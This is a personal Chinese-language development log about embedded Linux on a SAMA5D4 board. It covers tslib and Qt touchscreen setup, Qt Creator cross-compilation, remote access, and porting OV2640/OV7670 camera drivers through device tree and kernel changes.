export TSLIB_TSDEVICE=/dev/input/event0
然后 screenshot 成功了!!!! 成功用上了 tslib矫正的触摸屏,但是出现一个新问题,按键并不是特别灵光!!
而 fingerpaint 虽然没有提示 ts_open() faired with error 但是似乎没有 用上矫正过的触摸屏,而还是用原生的,
QT 用原生出现的问题具体是 x轴正常, y轴是中点反对称地出现!!!

也就是虽然可以使用上 tslib 了 但是还有很多问题:
animation/easing 滑动条不能滑动!只能跳着过 没有tslib前可以拖着滑动!!
但是animation/states 可以拖动!!
按键不灵光
touch/fingerpaint(绘图) 好像没用上tslib
touch/dials(数字旋表,就像汽车转速表) 好像没用上tslib
qpa/windows 好像用上了,但是出现跳屏!!!

修改profile删掉
export QT_QPA_GENERIC_PLUGINS=tslib
export TSLIB_TSDEVICE=/dev/input/event0
只添加:
export QT_QPA_GENERIC_PLUGINS=tslib:/dev/input/event0
效果一样!!!










20170221
字符显示!!
(注意只是从 buildroot 里制作的根文件系统做的实验,未知其他根文件系统会是怎么样!!!)
之前的测试一直没有字符显示!!!
按网上方法!!
把pc机的 /usr/share/fonts/truetype/dejavu 文件夹拷到开发板的 /usr/share/fonts/dejavu
然后 开发板profile添加!!
export QT_QPA_FONTDIR=/usr/share/fonts/dejavu
(补充,未实现!!)
关于中文字符的显示,据搜索说是要,添加 /usr/share/fonts/truetype/arphic 然后,profile做同样修改!!
研究屏幕键盘!!!
安装 qtcreator4.2 ,及配置环境 
官网下载 qt-creator-opensource-linux-x86_64-4.2.0.run 安装包
直接指令安装 ./qt-creator-opensource-linux-x86_64-4.2.0.run
安装后,就要配置qtcreator的编译选项:工具tools -> build and run窗口
先配置 QT Version
	先了解qt的编译工作流程!!!例如我要编译一个面向 armmv7-a 的窗口程序,用到 qt5.6 的库
	首先,我使用 面向armv7-a 的 qt5.6 的 qmake 工具 编译这个窗口程序工程的.pro配置文件!!! 最后生成 指定Makefile
	然后, 使用makefile 编译出真正的执行文件
	QT Version配置,我们需要使用 哪个版本,面向那种机器的qt库, 我们就把他对应的qmake工具加进来!!
	我们添加了 面向armv7-a 的 qt5.6 的 qmake 工具
	然而报错说我们 缺乏指定的编译器!!
配置 编译器
	上述 面向armv7-a 的 qt5.6 的 qmake 工具 就指明了 他生成的 makefile 是使用我们之前指定的 arm-linux-gnueabihf-gcc 系列工具
	来编译成 执行文件 的, 所以我们要把 arm-linux-gnueabihf-gcc 系列工具 添加到这里来,
	分别独立添加 对应 gcc 和 g++
	然后回到 QT Version 发现刚刚添加的 面向armv7-a 的 qt5.6 的 qmake 工具 不再报错!!
配置 DEbuggers
	arm-linux-gnueabihf-gcc 系列工具 也有gdb 调试工具, 但是不会用,加不加无所谓
配置CMake
	不用管
构建套件(kit)
	不使用 QT creator 时,要生成一个窗口可执行文件,我们需要使用多条编译指令,使用多个编译器
	但是配置成一个套件后,使用 QT creator 生成一个窗口可执行文件,只是一个按键的事情,
	这里要用到的工具捆绑在一起
	添加一个套件:
	名称自选
	设备类型, 对于嵌入式触摸屏设备,推荐使用 桌面就可以,选择通用linux设备,需要自己定义一台设备,相当麻烦!!
	Sysroot 不管
	编译器C 选刚刚加入的 arm-linux-gnueabihf-gcc
	编译器C++ 选刚刚加入的 arm-linux-gnueabihf-g++
	调试器 选刚刚加入的 arm-linux-gnueabihf-gdb
	QT版本 选QT5.6.2 这是刚刚加的 qmake 识别出来的QT版本
配置好,弄个例程编译试试: example里的 screenshot
注意,要在项目那检查工程配置
	选择新构建的套件:
	它的qmake 里编译用到的 qmake命令
	它的make 里编译用到的 make 命令
编译时注意:
由于是使用arm架构的gcc编译工具,所以,并不能在pc机上做debug 所以,只需要按 build 按钮就好了,
最后烧录到开发板,测试通过!!!!

移植屏幕键盘到开发板!!
现实










20170222
搞好ssh 远程桌面!!!
重启ssh服务：
	sudo /etc/init.d/ssh restart
然后确认sshserver是否启动了：（或用“netstat -tlp”命令)
	ps -e | grep ssh

简单局域网相连:
ssh -X root@200.200.200.102	// 
sudo ssh -X 200.200.200.102	//这两条命令作用相同,都是登陆到 ip为200.200.200.102的pc机 的root用户!!
sudo ssh -X infortech-ubuntu-1404@200.200.200.102 //
sudo ssh -X infortech-ubuntu-1404@200.200.200.102 //这两条命令作用相同,都是登陆到 ip为200.200.200.102的pc机 的infortech-ubuntu-1404用户!!
出错:
Permission denied, please try again. 
解决:
要修改 ip为200.200.200.102的pc机 的root的ssh权限，即修改 /etc/ssh/sshd_config文件中
	PermitRootLogin no 改为 PermitRootLogin yes 
此外, -X 表示窗口界面,不是命令行终端,但没有成功使用窗口登陆!!

拷贝文件操作!!
kingders@kingders-ThinkPad-T420:~$ scp ./安川电机/report infortech-ubuntu-1404@200.200.200.102:./桌面
//把 本机的/home/kingders/安川电机/report 文件   拷贝到   ip为200.200.200.102的pc机的/home/infortech-ubuntu-1404/桌面 文件夹 去
kingders@kingders-ThinkPad-T420:~$ scp infortech-ubuntu-1404@200.200.200.102:./桌面/temp_20170117 ./Desktop
//把 ip为200.200.200.102的pc机的/home/infortech-ubuntu-1404/桌面/temp_20170117 文件   拷贝到   本机的/home/kingders/Desktop 文件夹 去 

挂载远程硬盘(未完待续)

最后还是脱离了ssh 使用上了基于vnc 的远程桌面
sudo apt-get install xrdp //安装 xrdp 多了一个 Desktop Sharing Preferences 的选项框
这样就装上了两款软件!!!
Desktop Sharing /桌面共享
Remmina Remote Desktop Client / Remmina远程桌面客户端!!
被远程控制的机子 在 桌面共享 里 选允许其他人查看/控制您的桌面,安全 不选"进行访问确认"
要远程控制的机子 打开 Remmina远程桌面客户端 新建->协议是VNC虚拟网络计算->填写:
	被远程控制的机子的ip
	其他的可以都不填(不知道为啥)
然后就可以connect过去了

还有一个更加傻瓜的方法就是使用 teamviewer
另外,安装google远程桌面 和 teamviewer 时 注入了一个bug 会启动 deja-dup-monitor 无限吃内存!!!卡死机器!!!
鉴于 deja-dup-monitor 并没有啥用 直接 重命名 让bug读取不到!!!
罪魁祸首还是 google-chrome, 删掉就好了!!!

最后关于 ubuntu 两种软件安装方式  apt-get 和 .deb包!!
主要用到apt-get dpkg两个命令：
1. 快速使用
安装软件 apt-get install softname1 softname2 softname3……
卸载软件 apt-get remove softname1 softname2 softname3……
卸载并清除配置 apt-get remove --purge softname1
更新软件信息数据库 apt-get update
进行系统升级 apt-get upgrade
搜索软件包 apt-cache search softname1 softname2 softname3……
修正（依赖关系）安装：apt-get -f install

安装deb软件包 dpkg -i xxx.deb
删除软件包 dpkg -r xxx		//不需要写deb包全名 xxx_版本_架构.deb
连同配置文件一起删除 dpkg -r --purge xxx.deb
查看软件包信息 dpkg -info xxx.deb
查看文件拷贝详情 dpkg -L xxx.deb
查看系统中已安装软件包信息 dpkg -l
重新配置软件包 dpkg-reconfigure xx
sudo dpkg -p package_name卸载软件包及其配置文件，但无法解决依赖关系！
sudo aptitude purge pkgname卸载软件包及其配置文件与依赖关系包！ 
清除所有已删除包的残馀配置文件
dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P
如果报如下错误，证明你的系统中没有残留配置文件了，无须担心。








20170224
移植 摄像头!! 
首先,分别使用ov7670 和 ov3640 两款摄像头
使用两种协议工作: 
	ISI:传输图像数据
	I2C:控制摄像头
涉及文件 atmel-isi.c ov2640.c ov7670.c
采集原理:
	cmos硬件采集 -> isi协议传输数据 -> V4L2中间库 -> 应用程序
总的说,	ov2640.c是i2c从设备, 
	atmel-isi.c是isi的平台设备,
	那么对应ov2640的isi从设备是哪一个,难道 ov2640.c兼顾?
	make ARCH=arm menuconfig 里关于 isi i2c ov2640 v4l2 该选的都选上了 
纠错:上述热时错误是,直接把 xxx平台设备等同于 XXX协议总线!!!
	xxx平台设备是挂在 平台总线 上的一个设备而已,虽然大多数平台设备都可以操作硬件寄存器
	以一个例子为例
		i2c-core.c是 构成i2c协议总线
		i2c-at91.c是 挂载在 platform协议总线 上的i2c控制器驱动设备
		i2c协议总线 与 platform总线协议 本质上是同阶级的 都是抽象出来的总线
		i2c-at91.c(i2c控制器设备) 会给 i2c协议总线 一个接口,
		xxxx.c是 挂载在 i2c协议总线 上的 i2c从设备,
		操作 i2c从设备时,归根到底还是操作 主芯片i2c控制器,
		i2c从设备 通过 i2c协议总线 上公开的i2c控制器接口, 实现控制i2c控制器从而实现i2c从设备的功能!!!

dts的examples 写法也疑惑: 注意,以下是 ,txt的例子,并非.dts里的实例
设置isi的!!
Example: isi: isi@f0034000 { compatible = "atmel,at91sam9g45-isi";
		reg = <0xf0034000 0x4000>;
		interrupts = <37 IRQ_TYPE_LEVEL_HIGH 5>;
		clocks = <&isi_clk>;
		clock-names = "isi_clk";
		pinctrl-names = "default";
		pinctrl-0 = <&pinctrl_isi>;
		port { 
			#address-cells = <1>;
			#size-cells = <0>;
			isi_0: endpoint { 
				remote-endpoint = <&ov2640_0>;
				bus-width = <8>; 
			}; 
		}; 
	};
	i2c1: i2c@f0018000 { ov2640: camera@0x30 { compatible = "ovti,ov2640";
			reg = <0x30>;
			port { 
				ov2640_0: endpoint { 
					remote-endpoint = <&isi_0>;
					bus-width = <8>; 
					}; 
				}; 
			}; 
		}; 
设置ov2640的!!
Example:
	i2c1: i2c@f0018000 { 
		ov2640: camera@0x30 { 
			compatible = "ovti,ov2640";
			reg = <0x30>;
			pinctrl-names = "default";
			pinctrl-0 = <&pinctrl_pck1 &pinctrl_ov2640_pwdn &pinctrl_ov2640_resetb>;
			resetb-gpios = <&pioE 24 GPIO_ACTIVE_LOW>;
			pwdn-gpios = <&pioE 29 GPIO_ACTIVE_HIGH>;
			clocks = <&pck1>;
			clock-names = "xvclk";
			assigned-clocks = <&pck1>;
			assigned-clock-rates = <25000000>;
			port { 
				ov2640_0: endpoint { 
					remote-endpoint = <&isi_0>;
					bus-width = <8>; 	//v4l2_of_parse_parallel_bus //重点,从获得的endpoint中的提取设置信息,
				}; 				//video-interfaces.txt //设置信息参考文件!!!
			}; 
		}; 
	}; 

简阅atmel-isi.c 
isi_clk = isi->pclk	//分清两个时钟
iscclk = isi->iscck
probe:
atmel_isi_parse_dt() //分析endpoint的内容 其实就是把isi协议的所有设置上的内容!!
	v4l2_of_parse_parallel_bus //重点,从获得的endpoint中的提取设置信息,
	video-interfaces.txt //设置信息参考文件!!!
申请dma framebuffer 缓存
申请irq
soc_camera_host_register //
分析发现驱动中, isc层是直接控制硬件的, isc接入isi层,isi层又是与v4l2层接轨的
而 isi 对应着 soc_camera 这层内容!!! //可以参考gpio_keys的做法









20170227
RGB 格式直接显示的, 
YCbCu 是编码的格式,使用于压缩MP4格式的文件
ov7670 cmos芯片的针脚!
	pclk: 像素输出时钟! 是由ov芯片输出的时钟 	senor发出
	D0-7: 图像并排数据针	senor发出
	xclk: 提供ov芯片运行的时钟信号脚 典型是 24Mhz
	scl: i2c时钟针
	sda: i2c数据针
	vsync: 帧起始信号	senor发出
	href: 行起始信号	senor发出
	reset: 重置针 ,正常状态下高电平 低电平触发
	pwdn: power down 针
	Fsin: frame synchronize input 	帧同步未知实际作用,但实际可不接!!	senor接收!!!!
就是说,除了 isi 和i2c 的接口外 还要自己定义 pwdn reset xclk针!!
pwdn reset 两gpio功能针的配置,要另外使用dts 自己做一个pinctrl出来!!//可以参考 at91-sama5d4_xplaint.dts gpio_keys的做法
xclk 输出时钟针的配置!! 		//xclk即 datasheet的 isi_mck 即 Programmable Clock output 1(PCK1)
xclk 指 pc4 或pc24 或pd31	//没有参考设置输出时钟的!!的例子
想起到 www.at91.com 找 camera
居然还真找到!!!我去, github 的linux源码里 有一个 at91-sama5d4ek_isi.dts 直接就是ov2640模块的!!

ov2640的针口配置:
	ov2640并口数据针共10位 D0-D9,   ov2640    默认使用   10针高位模式,
	但是买回来的 waveshare做的模块 只能使用8针高位模式,所以设置0xda寄存器为8针高位模式,
	8针高位指,工作针为D2-D9的模式 (0xdA的bit0 值为0, bit6 值为1),
	按道理 ov2640处于8针高位模式, 那么 D2-D9针 应接sama5d4 的 isi_D0 - isi_D7
	按道理 ov2640处于10针高位模式,那么 D0-D9针 应接sama5d4 的 isi_D0 - isi_D9
	而现在的奇怪情况是: ov2640处于10针高位模式
		但是 D2-D9针 接sama5d4 的 isi_D0 - isi_D7 并没有发现出现问题!!!
		还有的是,这时的linux设置的 isi 是 8位数据针模式

sama5d4对应的针口:
	AT91_PIOC 19 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D0 */
	AT91_PIOC 20 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D1 */
	AT91_PIOC 21 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D2 */
	AT91_PIOC 22 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D3 */
	AT91_PIOC 23 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D4 */
	AT91_PIOC 24 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D5 */
	AT91_PIOC 25 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D6 */
	AT91_PIOC 26 AT91_PERIPH_A AT91_PINCTRL_NONE	/* ISI_D7 */
	AT91_PIOB  1 AT91_PERIPH_C AT91_PINCTRL_NONE	/* ISI_PCK, conflict with G0_RXCK */
	AT91_PIOB  3 AT91_PERIPH_C AT91_PINCTRL_NONE	/* ISI_VSYNC */
	AT91_PIOB  4 AT91_PERIPH_C AT91_PINCTRL_NONE	/* ISI_HSYNC */
	AT91_PIOA 30 AT91_PERIPH_A AT91_PINCTRL_NONE	/* TWD0 */
	AT91_PIOA 31 AT91_PERIPH_A AT91_PINCTRL_NONE	/* TWCK0 */
	AT91_PIOC  4 AT91_PERIPH_C AT91_PINCTRL_NONE	/* PC4 periph C ISI_MCK */ 与sd卡复用了pd8 所以要disable mmc0
	AT91_PIOB  5 AT91_PERIPH_GPIO AT91_PINCTRL_NONE /* PB5 power down */
	AT91_PIOB 11 AT91_PERIPH_GPIO AT91_PINCTRL_NONE	/* PB11 reset */ 







20170228
加载摄像头功能: (修改内核)
修改dts,给at91-sama5d4_xplained.dts插入,以下相关内容!!
/ {
	ahb {
		apb {
			pinctrl@fc06a000 {
				board {
					pinctrl_pck1_as_isi_mck: pck1_as_isi_mck-0 {
						atmel,pins =
							<AT91_PIOC  4 AT91_PERIPH_C AT91_PINCTRL_NONE>; /* PC4 periph C ISI_MCK */
					};

					pinctrl_sensor_power: sensor_power {
						atmel,pins =
							<AT91_PIOB  5 AT91_PERIPH_GPIO AT91_PINCTRL_NONE>; /* PB5 gpio */
					};

					pinctrl_sensor_reset: sensor_reset {
						atmel,pins =
							<AT91_PIOB 11 AT91_PERIPH_GPIO AT91_PINCTRL_NONE>; /* PB11 gpio */
					};
				};
			};
		};
	};
};

&usart2 {
	status = "disabled";
};

&spi0 {
	status = "disabled";
};

&mmc00 {
	status = "disabled";
};

&isi {
	status = "okay";

	port {
		isi_0: endpoint@0 {
			remote-endpoint = <&ov2640_0>;
			bus-width = <8>;
			vsync-active = <1>;
			hsync-active = <1>;
		};
	};
};

&i2c0 {
	status = "okay";
	ov2640: camera@0x30 {
		compatible = "ovti,ov2640";
		reg = <0x30>;
		pinctrl-names = "default";
		pinctrl-0 = <&pinctrl_pck1_as_isi_mck &pinctrl_sensor_power &pinctrl_sensor_reset>;
		resetb-gpios = <&pioB 11 GPIO_ACTIVE_LOW>;
		pwdn-gpios = <&pioB 5 GPIO_ACTIVE_HIGH>;
		/* use pck1 for the master clock of ov2640 */
		clocks = <&pck1>;
		clock-names = "xvclk";
		assigned-clocks = <&pck1>;
		assigned-clock-rates = <25000000>;

		port {
			ov2640_0: endpoint {
				remote-endpoint = <&isi_0>;
				bus-width = <8>;
			};
		};
	};
};
menuconfig:添加
select the menu: "Device Drivers -> Multimedia support -> Sensors used on soc_camera driver -> ov2640 camera support"
select the menu: "Device Drivers -> Multimedia support -> Media Controller API"
select the menu: "Device Drivers -> Multimedia support -> V4L2 sub-device userspace API"
select the menu: "Device Drivers -> Multimedia support -> Autoselect ancillary drivers (tuners, sensors, i2c, 
另外,如果要选择老版本摄像头芯片,例如 ov7670 等
	deselect the menu: "Device Drivers -> Multimedia support -> Autoselect ancillary drivers (tuners, sensors, i2c, 
	find in the menu: "Device Drivers -> Multimedia support -> Encoders, decoders, sensors and other helper chips ->其他xxx芯片"
添加 pr_debug 到 atmel-isi.c 和 ov2640.c 调试!!! //参考之前的操作!!!
编译 缮写
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- 
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c write:at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000
开机,如果发现以下log内容,可以初步认为驱动已经成功运行了!!!
soc-camera-pdrv soc-camera-pdrv.0: Probing soc-camera-pdrv.0
ov2640 0-0030: ov2640 Product ID 26:42 Manufacturer ID 7f:a2
i2c i2c-0: OV2640 Probed

在尝试采集图片之前,先尝试显示jpg图片!!
先处理好网络功能!!
udhcpc 初始化网络环境
关于 tftp 传输文件的命令!!(在开发板上使用的 规范写法)
	tftp -g 200.200.200.102 -r ./aaa -l ./bbb	//取得ip200.200.200.102的tftp服务器路径下的aaa文件,拷贝到当前文件夹并改名为bbb
							//如果当前文件夹已存在 bbb 文件,则替换他!!!
	tftp -p 200.200.200.102 -r ./ccc -l ./ddd	//把当前文件夹的 ddd 文件,上传到ip200.200.200.102的tftp服务器路径上
							//直接替换掉 服务器上的 ccc 文件,
							//如果服务器本身没有 ccc 文件,那么命令就会出错不工作!!
那么我们把得到的图片回放上来就可以了!!!
然后,使用 atmel推荐的 fswebcam,最简单做法:使用 buildroot1 给文件系统添加这个内->置内容
make menuconfig 添加:
	Target packages -> Graphic libraries and applications (graphic/text) -> fswebcam
make -j8
测试命令:
fswebcam -S 20 -d /dev/video0 -p RGB565 -r 640x480 uio.jpg	//跳过开头20帧采样,在当前文件夹得到uio.jpg图片文件!!
tftp回电脑 成功显示!!!

下一步,移植 ov7670 到新架构!!!!!









20170301
移植 ov7670 到新架构
ov7670 和 ov2640 的reset 和 pwdn 针的控制方式一致
reset: 低电平触发,平时处于高电平
pwdn: 高电平触发 平时处于低电平
ov7670 和 ov2640 的 i2c协议控制参数一致
关于 ov7670 和 ov2640 的区别:
ov7670 30万像素,
ov2640 200万像素,
ov7670 控制的寄存器在同一个块里
ov2640 控制的寄存器分成两个块,sensor块 和 DSP块, 要范文相关控制寄存器,要先设置寄存器所处的块!!!
还有能支持的编码格式:
	都不一样,还有的是,ov7670多了 一个叫 matrix
	注意移植修改重点 ov2640_enum_mbus_code() -> ov7670_enum_mbus_code()
		忽略掉 matrix 的调整!!
		ov7670_supported_win_sizes 的内容及后续内容没有改!!!!!!!关于7670的采样格式规范问题!!!
			ov7670_get_fmt的 MEDIA_BUS_FMT 内容....

无意发现 出厂id与pdf 不一样!!
ov2640的 datasheet 是 26 41 7f a2  芯片读出的是 26 42 7f a2
ov7670的 datasheet 是 76 73 7f a2  芯片读出的是 87 87 87 87
还有真正的 i2c地址 与 datsheet 里的 i2c地址 也不一样!!
ov2640的 datasheet 是 0x60 芯片使用的是 0x30
ov7670的 datasheet 是 0x42 芯片使用的是 
使用ov7670时,发现出现了i2c不能访问的现象!!! 读出的pid和mid 都是87
ov7670的i2c并没有工作!!!
	一开始是怀疑地址 不对 因为出现了 nack
	后来地址改过来了,发现好像时钟也不对 ,出现了 control timed out
	两款芯片的i2c datasheet参数一样,所以跟i2c时钟没有问题
	最后发现 芯片可写,但不可读!!!读寄存器时,直接出错!!!









20170303
先搁置驱动移植细节,先做好移植架构!!
at91-sama5d4_xplained.dts i2c添加:
			isi: isi@f0008000 {
				status = "okay";
				port {
					isi_1: endpoint@1 {
						remote-endpoint = <&ov7670_0>;
						bus-width = <8>;
						vsync-active = <1>;
						hsync-active = <1>;
					};
				};
			};
			i2c0: i2c@f8014000 {
				status = "okay";
				/* have to set clock-frequency, otherwise use default-scl 100khz */
				clock-frequency = <100000>;	
				/* by william about ov7670 */
				ov7670: camera@0x21 {
					compatible = "ovti,ov7670";
					/* ov7670 i2c 8bits-addr 0x42w 0x43r 7bits-addr 0x21 */
					reg = <0x21>;	
					pinctrl-names = "default";
					pinctrl-0 = <&pinctrl_pck1_as_isi_mck &pinctrl_sensor_power &pinctrl_sensor_reset>;
					resetb-gpios = <&pioB 11 GPIO_ACTIVE_LOW>;
					pwdn-gpios = <&pioB 5 GPIO_ACTIVE_HIGH>;
					/* use pck1 for the master clock of ov2640 */
					clocks = <&pck1>;
					clock-names = "xvclk";
					assigned-clocks = <&pck1>;
					/* assigned-clock-rates = <25000000>; */
					assigned-clock-rates = <24000000>;

					port {
						ov7670_0: endpoint {
							remote-endpoint = <&isi_1>;
							bus-width = <8>;
						};
					};
				};
			};

新添加 ov7670_dts.c 到/home/infortech-ubuntu-1404/SAMA5D4/sources/kernel/kernel1/linux-at91-master/drivers/media/i2c/soc_camera
修改 ov7670_dts.c 基于ov2640.c修改的dts架构的驱动!,注意修改以下内容:
static const struct i2c_device_id ov7670_id[] = {
	{ "ov7670", 0 },	//看过源码,0这一项没有使用,所以填 0 !!
	{ }
};
MODULE_DEVICE_TABLE(i2c, ov7670_id);

static const struct of_device_id ov7670_of_match[] = {
	{.compatible = "ovti,ov7670", },
	{},
};
MODULE_DEVICE_TABLE(of, ov7670_of_match);

static struct i2c_driver ov7670_i2c_driver = {
	.driver = {
		.name = "ov7670",
		.of_match_table = of_match_ptr(ov7670_of_match),
	},
	.probe    = ov7670_probe,
	.remove   = ov7670_remove,
	.id_table = ov7670_id,
};

module_i2c_driver(ov7670_i2c_driver);

MODULE_DESCRIPTION("SoC Camera driver for Omni Vision 2640 sensor");
MODULE_AUTHOR("william huang");
MODULE_LICENSE("GPL v2");

修改 /home/infortech-ubuntu-1404/SAMA5D4/sources/kernel/kernel1/linux-at91-master/drivers/media/i2c/soc_camera/Makefile 添加:
#by william
obj-$(CONFIG_SOC_CAMERA_OV7670DTS)	+= ov7670_dts.o

修改 /home/infortech-ubuntu-1404/SAMA5D4/sources/kernel/kernel1/linux-at91-master/drivers/media/i2c/soc_camera/Kconfig 添加:
# by william
config SOC_CAMERA_OV7670DTS
	tristate "ov7670 camera support in DTS"
	depends on SOC_CAMERA && I2C
	help
	  This is a ov2640 camera driver

make ARCH=arm menuconfig 就可以选择 ov7670 camera support in DTS 这项了
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- 就会去编译 ov7670_dts.c这个文件了!!!
把多余的错误纠正后得到成功编译驱动文件,接下来就是调试编译文件了!!!
由于只是把框架改过来而已,还保留着ov2640的功能,可以利用ov2640模块 测试驱动是否成功运行!!!
	只需要,把ov7670 dts i2c 的addr与ov2640 的就换过来测试
	结果 i2c访问ov2640失败,因为i2c地址不对,
	但是访问"ov7670"成功,因为ov7670驱动保留着ov2640的内容未更改,由于i2c地址也对上了,所以 ov7670驱动 成功运行,还抓取了图片
	证明 ov7670 的驱动框架没有问题,成功运行

接下来,要分析分析像摄像头这样复合功能的设备的实现!!
以 ov2640为例
整体说, 这个摄像头主要涉及到两个功能!!一个是i2c 一个是isi
而只需要工程师编写的 的文件只有 ov2640.c
但是涉及的内容有 soc_camera i2c 等子系统,还有 v4l2 isi 等内容!!!!
先看soc_camera 
涉及 soc_camera.c 和 soc_camera_platform.c 两个关键文件
重新讨论 soc_camera v4l2 和 ov2640.c 的关系:
v4l2 是 上层软件和 设备驱动层的 接口
soc_camera 是一个规范的摄像头驱动规范,不同的摄像头都通过接入这个规范是大大减少开发程度
ov2640.c就是摄像头驱动最底层工作的具体实现,他符合soc_camera规范,跟soc_camera共同组合才形成一个完成可用的摄像头驱动,供v4l2调用
从初始化:分析关系:
	先初始化 i2c从设备 ov2640.c 里头也填充了一些 soc_camera 的结构体
	然后初始化 atmel-isi.c 这里提取构建好各种isi的具体操作后,便注册 soc_camera_host_register	
	soc_camera_host_register -> soc_camera_scan -> soc_camera_probe
	最后才是 soc_camera_pdr_probe!!!
	注意,并没有看错,soc_camera_pdr_probe作为platform设备驱动,居然后于 isi 和 ov2640  注册到linux









20170309
暂时不移植 ov7670
使用上层软件测试 ov2640摄像头!!
使用 gsteamer0.1 把摄像头的实时图像显示到lcd上去!!
参考:http://www.at91.com/linux4sam/bin/view/Linux4SAM/UsingIsi
同样,直接往之前的buildroot上塞东西 gsteamer0.1
make menuconfig	添加: 
	Target Packages -> Audio and video application -> gsteamer 0.10
	~ gst-plugins-base -> ffmpegcolorspace
	~ gst-plugins-good -> v4l2
	~ gst-plugins-bad -> fbdev
	~ gst-ffmpeg
make -j8
然后烧录,
然后测试:
gst-launch v4l2src device="/dev/video0" ! video/x-raw-yuv,width=640,height=480 ! ffmpegcolorspace ! fbdevsink
成功看到采集的图像实时显示在lcd上!!

使用 gsteamer1.0 把摄像头的实时图像显示到lcd上去!!
参考:http://www.at91.com/linux4sam/bin/view/Linux4SAM/UsingIsi
同样,直接往之前的buildroot上塞东西 gsteamer0.1
make menuconfig	添加: 
	Target Packages -> Audio and video application -> gsteamer 0.10
	~ gst-plugins-base -> videoconvert
	~ gst-plugins-good -> v4l2
	~ gst-plugins-bad -> fbdev
make -j8
然后烧录,
然后测试:
gst-launch-1.0 v4l2src device="/dev/video0" ! video/x-raw,width=640,height=480 ! videoconvert ! fbdevsink
注意由于一开始,没有选上videoconvert 一直提示没有找到videoconvert模块,于是的重新make
重新make前先把 ~~output/build里的gstreamer1.0先关文件夹删掉,
只是重新加上gst-plugins-base -> videoconvert 并不会重新编译和添加videoconvert模块!!!
成功看到采集的图像实时显示在lcd上!!
提高 图像的fps 尝试提高时钟频率
这个摄像头驱动涉及 三个时钟 i2c通讯时钟, 提供摄像头芯片的主时钟 xvclk 还有摄像头芯片输出的图像时钟pclk
在dts里 i2c 时钟默认100khz 可以改到400khz
在dts里 xvclk 设置处后面的 assigned-clocks = <&pck1>; assigned-clock-rates = <25000000>;改的是时钟的参数,
	但是发现时钟的频率并不是  assigned-clock-rates = <25000000> 里的值,不轮怎么改都维持在 18Mhz
	一度以为这里并不是设置 xvclk的, 可一旦去掉 assigned-clock-rates = <25000000> 摄像头芯片就不工作!! i2c也启动不了
在dts里 pclk 最难发现现要在哪里修改!!! 不知道怎么改, 一直保持在 28mhz 

摄像像头采集窗口格式:
#define CIF_WIDTH	352	//10万像素
#define CIF_HEIGHT	288

#define QCIF_WIDTH	176
#define QCIF_HEIGHT	144

#define QQCIF_WIDTH	88
#define QQCIF_HEIGHT	72

#define QQVGA_WIDTH	160
#define QQVGA_HEIGHT	120

#define QVGA_WIDTH	320	
#define QVGA_HEIGHT	240

#define SVGA_WIDTH	800	//50万像素
#define SVGA_HEIGHT	600

#define SXGA_WIDTH	1280	//130万像素
#define SXGA_HEIGHT	1024

#define VGA_WIDTH	640	//30万像素
#define VGA_HEIGHT	480

#define UXGA_WIDTH	1600
#define UXGA_HEIGHT	1200

#define XGA_WIDTH	1024	//80万像素
#define XGA_HEIGHT	768
上述说明的 cif qcif qqcif qqvga qvga vga svga uxga xga 是典型的窗口格式
例如,cif窗口格式 典型是 352x288 分辨率的窗口!!!
ov2640 最大可以采集 1600X1200大小的图片, 但是,如果要采集一张 352x288 分辨率的图片,
	就要设置寄存器, 芯片就会处于一种设定的采集模式,通过选择采集矩阵排列上的特定点,最终组合成一张接近 352x288 分辨率 的图片!
	例如,ov2640 分析需求图片的分辨率,然后设置为 cif 的采集格式,然后采集出 一张400x296分辨率的图片,接近 352x288 分辨率
	不可能完全采集到完全等于 352x288 分辨率的图片,因为 采集是有规律选择cmos矩阵上的特定点!!,所以不可能完全符合需求的分辨率,只能接近.

关于 ov2640 的时钟频率的调节!!
	上述知道,dts设置的 xvclk 只是起到了一个开关的左右, 设置 25mhz 并未达到,事实上,不能设置多少mhz,输出还是18mhz
	然而xvclk 是sama5d4提供的时钟, 而不是ov2640真正工作的时钟
	查看ov2640的 datasheet 发现, 有两处修改时钟频率的的地方!!!
	clkrc: 对 xvclk 分频处理后 得到 ov2640芯片实际工作的时钟频率
	R_DVP_SP: ov2640 执行这个分频器处理后得到 输出时钟pclk 的时钟频率
	经测试,clkrc 分频系数为1,ov2640 已经处于最高速的工作时钟,
	R_DVP_SP 为2,也产生最高速的pclk输出时钟,不能为1,会失真,而且pclk频率相比起 R_DVP_SP 为2 的时候也没有变化!
	所以综合地说,提高 sama5d4提供的时钟, 或许是提高摄像头实时监测的唯一路径!!










20170314
注意 以后 未特殊说明!! mpu 直接代表 sama5d4 这芯片
关于 ov2640 的时钟频率的调节!! 续:
	无意间返现clkrc能够倍频 输入的xvclk信号,得到更高的芯片工作频率
	刚开始认为,芯片工作信号成倍增加,其他设置不变,输出的pclk也会成倍增加,输出的帧数就会成倍增加
	经足够测试`,发现pclk频率不能太高,不然输出图像明显不正常:
	mpu输出频率为18mhz clkrc倍频后 ov2640 的工作频率为36mhz,采集640X320 的视频.芯片默认vga模式采集, 
		R_DVP_SP的pclk分频设置为原来的2, pclk从原来的28mhz 升到 56mhz,然而 输出严重失真!! 但是,每帧44ms左右 每秒22.7帧
		R_DVP_SP的pclk分频设置为4,此消彼长,pclk保持原来的28mhz,但是输出正常,而且 每帧44ms 每秒22.7帧
	mpu输出频率为18mhz clkrc不设置 ov2640 的工作频率为18mhz,采集640X320 的视频.芯片默认vga模式采集, 
		R_DVP_SP的pclk分频设置为原来的2, pclk是原来的28mhz 但是输出正常,而且 每帧82.5ms 每秒12.1帧
	摄像头自带有源时钟 > 18Mhz, clkrc倍频后 ov2640 的工作频率为 > 36mhz,采集640X320 的视频.芯片默认vga模式采集, 
		R_DVP_SP的pclk分频设置为原来的2, pclk上升了一倍,然而 输出严重失真!!
